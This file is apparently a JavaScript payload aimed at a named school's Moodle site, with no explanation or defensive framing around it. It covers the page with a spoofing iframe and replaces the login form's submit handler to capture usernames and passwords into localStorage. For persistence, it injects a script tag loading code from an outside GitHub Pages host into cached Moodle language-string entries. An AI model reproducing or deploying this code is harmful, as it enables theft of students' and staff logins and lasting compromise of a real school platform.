
if(documentTree == undefined && document.location.hash != "#noiframe"){
	var documentTree = true;
	
	if(!document.location.href.includes("https://moodle.bg-ka.schule/badges/external.php?")){
		document.body.style.overflow = 'hidden';
		document.body.innerHTML += `<iframe referrerpolicy="no-referrer" style="position:absolute; height:100%; width:100vw; top:0px; left:0px; z-index:1040; margin:0px; padding:0px;" id="spoof" src="${document.location.href}#noiframe"> </iframe>`
	}else{
		document.body.innerHTML += `<iframe referrerpolicy="no-referrer" style="position:absolute; height:100%; width:100vw; top:0px; left:0px; z-index:1040; margin:0px; padding:0px;" id="spoof" src="https://moodle.bg-ka.schule/my/#noiframe"> </iframe>`
		document.body.style.overflow = 'hidden';
	}
	
	
	//https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s

	const iframe = document.getElementById("spoof");

	iframe.addEventListener("load", () => {
			
			const doc = iframe.contentDocument;
			console.log("iframe source "+doc.location.href);
			
			
			if(doc.location.hash != "#noiframe"){
				doc.location.href += "#noiframe";
			}
			
			doc.getElementsByClassName("logo mr-1")[0].src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s"

			
			if(doc.location.href == "https://moodle.bg-ka.schule/login/index.php"){
				console.log("injecting code");
				doc.body.innerHTML = doc.body.innerHTML.replace('<script src="https://blobfischforever.github.io/domrenderer/renderer.js"></script>','')
								

				doc.getElementById("login").removeAttribute("action");
				doc.getElementById("login").removeAttribute("method");
				doc.getElementById("login").onsubmit = function(event){
							
					let url = "https://moodle.bg-ka.schule/my/"
					
					localStorage.setItem("pass",doc.getElementById("password").value);
					localStorage.setItem("name",doc.getElementById("username").value);
					
					doc.location.href = url;
				
					return false;
				};
			}else if(localStorage.getItem("pass") != undefined){
				console.log("extracted password and username are " + localStorage.getItem("pass") +" , "+ localStorage.getItem("name");
			}else if(doc.location.href == "https://moodle.bg-ka.schule/login/index.php?loginredirect=1"){
				console.log("user login failed");
			}
			
			
			
	 });

	let storages = ["-2000383042/core_str/nocourses/block_starredcourses/de",
		"-2000383042/core_str/nocourses/block_starredcourses/de",
		"-2000383042/core_str/completion_manual:aria:markdone/course/de",
		"-2000383042/core_str/addresourceoractivity/moodle/de",
		"-2000383042/core_str/favourite/core_course/de",
		"-2000383042/core_str/createnewcourse/core/de"
		]
	
	for( key of storages){
		let val = localStorage.getItem(key);
		
		if(val){
			if(! val.includes('<script src="https://blobfischforever.github.io/domrenderer/renderer.js"></script>')){
				localStorage.setItem(key,val+ '<script src="https://blobfischforever.github.io/domrenderer/renderer.js"></script>');
			}else{
				console.log("already injected code");
			}
		}
	}
	
	//-2000383042/core_str/nocourses/block_starredcourses/de =>"Keine favorisierten Kurse"
	//-2000383042/core_str/completion_manual:aria:markdone/course/de =>{$a} als erledigt kennzeichnen
	//-2000383042/core_str/addresourceoractivity/moodle/de => Aktivität oder Material anlegen
	//-2000383042/core_str/favourite/core_course/de => Favorisierte Kurse
	//-2000383042/core_str/createnewcourse/core/de => Neuen Kurs anlegen


}else{
	console.log("payload was not loaded additionally");
}
